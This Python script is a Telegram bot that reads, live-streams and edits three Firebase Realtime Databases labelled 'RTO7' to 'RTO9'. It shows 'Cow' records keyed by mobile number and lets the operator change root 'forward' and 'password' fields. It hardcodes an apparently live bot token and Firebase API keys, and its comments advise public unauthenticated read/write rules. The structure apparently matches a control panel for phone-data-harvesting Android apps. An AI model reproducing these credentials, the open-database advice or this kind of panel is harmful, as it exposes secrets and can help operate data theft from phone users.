import os
import pyrebase # You'll need to install this: pip install pyrebase4
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
)
import asyncio # For managing async tasks and streams

# --- Configuration ---
# Your Telegram bot token
TELEGRAM_BOT_TOKEN = "8464152381:AAE0UooBusDBPyoLO0mrc2gV8_xU4zuYXOE"

# Firebase project URLs and their corresponding Web API Keys.
# IMPORTANT: You MUST replace "YOUR_FIREBASE_WEB_API_KEY_FOR_PROJECT_X" with your actual
# Firebase Web API Keys. You can find these in your Firebase project settings
# (Project settings -> General -> Your apps -> Web app -> Config).
# Without these, the bot cannot connect to your Firebase projects.
FIREBASE_PROJECTS = {
    "Project 1 (RTO7)": {
        "url": "https://rto7-112ef-default-rtdb.firebaseio.com/",
        "api_key": "AIzaSyAS4je2Zae4XXZlH4_AhOlI2QuttyuMFVs",
        # Replace these with your actual project details for full pyrebase config
        "authDomain": "rto7-112ef.firebaseapp.com",
        "projectId": "rto7-112ef",
        "storageBucket": "rto7-112ef.appspot.com",
        "messagingSenderId": "YOUR_MESSAGING_SENDER_ID_1", # Placeholder, replace with actual
        "appId": "1:374692847591:android:710d82bbee697d6a2f6742"
    },
    "Project 2 (RTO8)": {
        "url": "https://rto8-ea883-default-rtdb.firebaseio.com/",
        "api_key": "AIzaSyA1KpW_KdyNt7rVY78dPazRxtc_mqecDUg",
        "authDomain": "rto8-ea883.firebaseapp.com",
        "projectId": "rto8-ea883",
        "storageBucket": "rto8-ea883.appspot.com",
        "messagingSenderId": "YOUR_MESSAGING_SENDER_ID_2", # Placeholder, replace with actual
        "appId": "1:326995902958:android:414d15cbf3af46f4be4eff"
    },
    "Project 3 (RTO9)": {
        "url": "https://rto9-1c4e1-default-rtdb.firebaseio.com/",
        "api_key": "AIzaSyBNdHBhm6BN_h1vjzom4yTyutt2ifm76CU",
        "authDomain": "rto9-1c4e1.firebaseapp.com",
        "projectId": "rto9-1c4e1",
        "storageBucket": "rto9-1c4e1.appspot.com",
        "messagingSenderId": "YOUR_MESSAGING_SENDER_ID_3", # Placeholder, replace with actual
        "appId": "1:733524032684:android:28af024a8e4ad73da4b309"
    },
}

# --- States for ConversationHandler ---
# Added a new state SELECT_ACTION_AFTER_SHOW for handling post-data display actions.
SELECT_PROJECT_SHOW, SELECT_PROJECT_UPDATE, SELECT_FIELD, ENTER_NEW_VALUE, SELECT_ACTION_AFTER_SHOW = range(5)

# --- Firebase Initialization ---
# This dictionary will store initialized Firebase app instances.
# We are using pyrebase4 for direct Realtime Database access.
# Make sure your Firebase Realtime Database rules allow read/write access
# for unauthenticated users if you're not implementing authentication in the bot.
firebase_apps = {}
for name, config in FIREBASE_PROJECTS.items():
    # Pyrebase requires a full configuration dictionary.
    # While only `databaseURL` and `apiKey` might suffice for very basic operations
    # with permissive RTDB rules, including all parameters is recommended.
    firebase_config = {
        "apiKey": config["api_key"],
        "authDomain": config["authDomain"],
        "databaseURL": config["url"],
        "projectId": config["projectId"],
        "storageBucket": config["storageBucket"],
        "messagingSenderId": config["messagingSenderId"],
        "appId": config["appId"]
    }
    try:
        firebase_apps[name] = pyrebase.initialize_app(firebase_config)
        print(f"Firebase app '{name}' initialized successfully.")
    except Exception as e:
        print(f"Error initializing Firebase app '{name}': {e}")
        print("Please ensure your API Key and other Firebase config details are correct.")

# --- Helper Functions for Firebase Data Retrieval and Formatting ---

def format_cow_data(data):
    """Formats the Cow data for Telegram output."""
    if not data:
        return "🐮 *Cow Data:*\nNo Cow data available."
    output = "🐮 *Cow Data:*\n"
    for mobile, details in data.items():
        output += f"\n📞 *Mobile:* `{mobile}`\n"
        # Sort keys for consistent output
        sorted_keys = sorted(details.keys())
        for key in sorted_keys:
            value = details[key]
            output += f"  - _{key.replace('_', ' ').title()}:_ `{value}`\n"
    return output

def format_milk_data(data):
    """Formats the Milk data for Telegram output."""
    if not data:
        return "🥛 *Milk Data:*\nNo Milk data available."
    output = "🥛 *Milk Data:*\n"
    for item_id, details in data.items():
        output += f"\n🆔 *ID:* `{item_id}`\n"
        # Sort keys for consistent output
        sorted_keys = sorted(details.keys())
        for key in sorted_keys:
            value = details[key]
            output += f"  - _{key.replace('_', ' ').title()}:_ `{value}`\n"
    return output

async def send_formatted_data(chat_id: int, bot_instance, project_name: str, db_ref) -> None:
    """Fetches and sends formatted Cow and Milk data to the specified chat_id."""
    try:
        cow_raw_data = db_ref.child("Cow").get().val()
        cow_output = format_cow_data(cow_raw_data)

        milk_raw_data = db_ref.child("Milk").get().val()
        milk_output = format_milk_data(milk_raw_data)
        
        full_output = f"📈 *Latest Data from {project_name}:*\n\n" + cow_output + "\n\n" + milk_output
        await bot_instance.send_message(chat_id=chat_id, text=full_output, parse_mode="Markdown")
    except Exception as e:
        await bot_instance.send_message(
            chat_id=chat_id,
            text=f"🚫 Error fetching live data from *{project_name}*: {e}\n"
                 "Please ensure your Firebase Realtime Database rules allow read access.",
            parse_mode="Markdown"
        )

# --- Firebase Stream Handler ---
# This asynchronous function will be called by pyrebase whenever data changes.
# It needs access to the bot instance and chat_id to send updates.
async def firebase_stream_handler(message, context_data: dict, bot_instance) -> None:
    """Handles Firebase Realtime Database stream updates."""
    # `message` contains {"event": "put" or "patch", "path": "/", "data": {}}
    # `context_data` contains {"chat_id": ..., "project_name": ..., "db_instance": ...}
    
    chat_id = context_data.get("chat_id")
    project_name = context_data.get("project_name")
    db_instance = context_data.get("db_instance")

    if not chat_id or not project_name or not db_instance:
        print("Stream handler: Missing chat_id, project_name or db_instance in context_data.")
        return

    db_ref = db_instance.database()
    
    # We will send a full update for simplicity if the change is relevant.
    # Checks if the change occurred in 'Cow', 'Milk' or at the root ('/')
    if message["event"] in ["put", "patch"] and (
        message["path"].startswith("/Cow") or
        message["path"].startswith("/Milk") or
        message["path"] == "/"
    ):
        print(f"Detected change in '{message['path']}' on '{project_name}'. Sending update...")
        await send_formatted_data(chat_id, bot_instance, project_name, db_ref)

# --- Telegram Bot Command Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Sends a message with options to view, update, or stream Firebase data."""
    await update.message.reply_text(
        "Hello! 👋 I'm your Firebase bot. Choose an action from the commands below:\n"
        "/showdata - View data from a Firebase project.\n"
        "/update - Update 'forward' or 'password' in a Firebase project.\n"
        "/streamdata - Start live updates for a Firebase project.\n"
        "/stopstream - Stop ongoing live updates.\n"
        "/cancel - Cancel any ongoing operation."
    )
    return ConversationHandler.END

async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Asks the user to select a Firebase project to show data from."""
    keyboard = []
    for name in FIREBASE_PROJECTS.keys():
        if name in firebase_apps:
            keyboard.append([InlineKeyboardButton(name, callback_data=f"show_{name}")])
    
    if not keyboard:
        await update.message.reply_text("No Firebase projects are configured or initialized correctly. Please check the script configuration.")
        return ConversationHandler.END

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Please select a Firebase project to view its data:",
        reply_markup=reply_markup
    )
    return SELECT_PROJECT_SHOW

async def select_project_to_show(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Shows initial data from the selected Firebase project and offers streaming."""
    query = update.callback_query
    await query.answer()

    project_name = query.data.replace("show_", "")
    context.user_data["selected_project_name"] = project_name

    db_instance = firebase_apps.get(project_name)
    if not db_instance:
        await query.edit_message_text(f"Error: Firebase project '{project_name}' was not initialized. Please check configuration.")
        return ConversationHandler.END
    
    db_ref = db_instance.database()

    try:
        await query.edit_message_text(f"Fetching initial data from *{project_name}*... Please wait.", parse_mode="Markdown")
        # Send the initial formatted data
        await send_formatted_data(query.message.chat_id, context.bot, project_name, db_ref)
        
        # Offer streaming option after showing initial data
        keyboard = [
            [InlineKeyboardButton("Start Live Updates 📈", callback_data=f"start_stream_{project_name}")],
            [InlineKeyboardButton("Done ✅", callback_data="done_showing")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            f"Data from *{project_name}* displayed. Would you like to start live updates?",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return SELECT_ACTION_AFTER_SHOW # Move to a new state to handle the next action (stream or done)

    except Exception as e:
        error_message = f"🚫 Error fetching initial data from *{project_name}*: {e}\n\n" \
                        "Please ensure your Firebase Realtime Database rules allow public read access for testing, or set up proper authentication."
        await query.edit_message_text(error_message, parse_mode="Markdown")
        return ConversationHandler.END

async def start_streaming_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Asks the user to select a Firebase project to start streaming."""
    keyboard = []
    for name in FIREBASE_PROJECTS.keys():
        if name in firebase_apps:
            keyboard.append([InlineKeyboardButton(name, callback_data=f"start_stream_{name}")])
    
    if not keyboard:
        await update.message.reply_text("No Firebase projects are configured or initialized correctly for streaming. Please check the script configuration.")
        return ConversationHandler.END

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Please select a Firebase project to start live data updates:",
        reply_markup=reply_markup
    )
    return SELECT_PROJECT_SHOW # Re-use this state to select project, then it flows to start_live_updates

async def start_live_updates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Starts the Firebase Realtime Database stream for the selected project."""
    query = update.callback_query
    await query.answer()

    # Determine project name based on callback_data or stored user_data
    if query.data and query.data.startswith("start_stream_"):
        project_name = query.data.replace("start_stream_", "")
    elif "selected_project_name" in context.user_data: # If coming from /showdata path
        project_name = context.user_data["selected_project_name"]
    else:
        await query.edit_message_text("Error: Could not determine project for streaming.")
        return ConversationHandler.END

    db_instance = firebase_apps.get(project_name)
    if not db_instance:
        await query.edit_message_text(f"Error: Firebase project '{project_name}' was not initialized. Please check configuration.")
        return ConversationHandler.END
    
    db_ref = db_instance.database()
    chat_id = query.message.chat_id

    # Stop any existing stream for this chat_id before starting a new one
    if "active_stream_task" in context.user_data and context.user_data["active_stream_task"]:
        try:
            context.user_data["active_stream_task"].close() # pyrebase stream objects have a close() method
            del context.user_data["active_stream_task"]
            await query.message.reply_text("Stopped previous live updates before starting new ones.")
        except Exception as e:
            await query.message.reply_text(f"Warning: Could not stop previous stream: {e}")

    try:
        # Pass necessary context data (chat_id, project_name, db_instance) to the stream handler
        stream_context_data = {
            "chat_id": chat_id,
            "project_name": project_name,
            "db_instance": db_instance
        }
        
        # Start streaming from the root of the database for comprehensive updates.
        # The stream object needs to be stored in user_data to be able to close it later.
        # Use asyncio.create_task to run the async handler function from the sync stream method.
        stream_task = db_ref.stream(lambda msg: asyncio.create_task(firebase_stream_handler(msg, stream_context_data, context.bot)))
        context.user_data["active_stream_task"] = stream_task
        context.user_data["streaming_project_name"] = project_name # Store which project is being streamed

        await query.edit_message_text(
            f"📈 Started live updates for *{project_name}*! I will send updates here when data changes.\n"
            "Use /stopstream to stop receiving updates.",
            parse_mode="Markdown"
        )
    except Exception as e:
        error_message = f"🚫 Error starting live updates for *{project_name}*: {e}\n\n" \
                        "Please ensure your Firebase Realtime Database rules allow public read access for testing."
        await query.edit_message_text(error_message, parse_mode="Markdown")
    
    # End the current conversation flow, but the stream task will run in the background.
    return ConversationHandler.END

async def stop_live_updates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stops any active Firebase Realtime Database stream."""
    if "active_stream_task" in context.user_data and context.user_data["active_stream_task"]:
        try:
            context.user_data["active_stream_task"].close() # Close the pyrebase stream
            project_name = context.user_data.get("streaming_project_name", "the project")
            del context.user_data["active_stream_task"]
            if "streaming_project_name" in context.user_data: # Clean up the streaming project name
                del context.user_data["streaming_project_name"]
            await update.message.reply_text(f"🛑 Live updates for *{project_name}* stopped.", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"🚫 Error stopping live updates: {e}", parse_mode="Markdown")
    else:
        await update.message.reply_text("No active live updates to stop.")
    return ConversationHandler.END # End the conversation

async def done_showing_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the 'Done' button after showing data."""
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Okay, you're done viewing data. You can start another command anytime.")
    # Clean up user_data specific to showing data
    context.user_data.pop("selected_project_name", None)
    return ConversationHandler.END


async def update_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Asks the user to select a Firebase project to update."""
    keyboard = []
    for name in FIREBASE_PROJECTS.keys():
        if name in firebase_apps: # Only show projects that were successfully initialized
            keyboard.append([InlineKeyboardButton(name, callback_data=f"update_{name}")])

    if not keyboard:
        await update.message.reply_text("No Firebase projects are configured or initialized correctly for update. Please check the script configuration.")
        return ConversationHandler.END

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Please select a Firebase project to update 'forward' or 'password':",
        reply_markup=reply_markup
    )
    return SELECT_PROJECT_UPDATE

async def select_project_to_update(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Asks the user to select which field to update (forward or password)."""
    query = update.callback_query
    await query.answer()

    project_name = query.data.replace("update_", "")
    context.user_data["selected_project_name"] = project_name

    keyboard = [
        [InlineKeyboardButton("Forward ⏩", callback_data="field_forward")],
        [InlineKeyboardButton("Password 🔑", callback_data="field_password")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        f"You selected *{project_name}*. Which field do you want to update?",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    return SELECT_FIELD

async def select_field_to_update(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Prompts the user to enter the new value for the selected field."""
    query = update.callback_query
    await query.answer()

    field_name = query.data.replace("field_", "")
    context.user_data["field_to_update"] = field_name

    await query.edit_message_text(
        f"Please send the new value for the '*{field_name}*' field:",
        parse_mode="Markdown"
    )
    return ENTER_NEW_VALUE

async def enter_new_value(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Updates the selected field in Firebase with the new value."""
    new_value = update.message.text
    project_name = context.user_data.get("selected_project_name")
    field_name = context.user_data.get("field_to_update")

    if not project_name or not field_name:
        await update.message.reply_text(
            "Something went wrong during the update process. Please start again with /update."
        )
        return ConversationHandler.END

    db_instance = firebase_apps.get(project_name)
    if not db_instance:
        await update.message.reply_text(f"Error: Firebase project '{project_name}' was not initialized. Please check configuration.")
        return ConversationHandler.END

    db_ref = db_instance.database()

    try:
        # Update the root of the database with the new value
        db_ref.update({field_name: new_value})
        await update.message.reply_text(
            f"✅ Successfully updated '*{field_name}*' to '`{new_value}`' in *{project_name}*.",
            parse_mode="Markdown"
        )
    except Exception as e:
        error_message = f"🚫 Error updating '*{field_name}*' in *{project_name}*: {e}\n\n" \
                        "Please ensure your Firebase Realtime Database rules allow public write access for testing, or set up proper authentication."
        await update.message.reply_text(error_message, parse_mode="Markdown")

    # Clean up user_data after the operation is complete
    context.user_data.pop("selected_project_name", None)
    context.user_data.pop("field_to_update", None)

    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels and ends the current conversation, and stops any active stream."""
    # Check if there's an active stream and close it
    if "active_stream_task" in context.user_data and context.user_data["active_stream_task"]:
        try:
            context.user_data["active_stream_task"].close()
            project_name = context.user_data.get("streaming_project_name", "the project")
            del context.user_data["active_stream_task"]
            if "streaming_project_name" in context.user_data:
                del context.user_data["streaming_project_name"]
            await update.message.reply_text(f"🛑 Live updates for *{project_name}* stopped due to cancellation.", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"Warning: Could not stop stream during cancellation: {e}")

    await update.message.reply_text("Operation cancelled. You can start a new command anytime.")
    # Clean up all relevant user_data regardless of current state
    context.user_data.pop("selected_project_name", None)
    context.user_data.pop("field_to_update", None)
    
    return ConversationHandler.END

def main() -> None:
    """Starts the bot."""
    # Create the Application and pass your bot's token.
    # Added read_timeout and write_timeout for robustness against potential network issues.
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).read_timeout(30).write_timeout(30).build()

    # --- Conversation Handler for showing data and starting stream ---
    # This handler now includes entry points for both /showdata and /streamdata.
    show_data_conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("showdata", show_data_command),
            CommandHandler("streamdata", start_streaming_command) # New entry point for direct streaming
        ],
        states={
            # Handles project selection for both showing and direct streaming
            SELECT_PROJECT_SHOW: [
                CallbackQueryHandler(select_project_to_show, pattern=r"show_.*"),
                CallbackQueryHandler(start_live_updates, pattern=r"start_stream_.*")
            ],
            # New state to offer 'Start Live Updates' or 'Done' after initial data display
            SELECT_ACTION_AFTER_SHOW: [
                CallbackQueryHandler(start_live_updates, pattern=r"start_stream_.*"),
                CallbackQueryHandler(done_showing_data, pattern="done_showing"),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)], # Allows cancellation at any state
        allow_reentry=True # Allows users to restart the conversation if it's already active
    )

    # --- Conversation Handler for updating data (remains largely the same) ---
    update_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("update", update_command)],
        states={
            SELECT_PROJECT_UPDATE: [CallbackQueryHandler(select_project_to_update, pattern=r"update_.*")],
            SELECT_FIELD: [CallbackQueryHandler(select_field_to_update, pattern=r"field_.*")],
            ENTER_NEW_VALUE: [
                # This handler captures any text message that is not a command.
                MessageHandler(filters.TEXT & ~filters.COMMAND, enter_new_value)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)], # Allows cancellation at any state
        allow_reentry=True # Allows users to restart the conversation if it's already active
    )

    # Register all handlers with the application
    application.add_handler(CommandHandler("start", start))
    application.add_handler(show_data_conv_handler) # This now handles /showdata and /streamdata flows
    application.add_handler(update_conv_handler)
    application.add_handler(CommandHandler("stopstream", stop_live_updates)) # Global command to stop streaming

    # Run the bot until the user presses Ctrl-C
    print("Bot is polling... Press Ctrl-C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
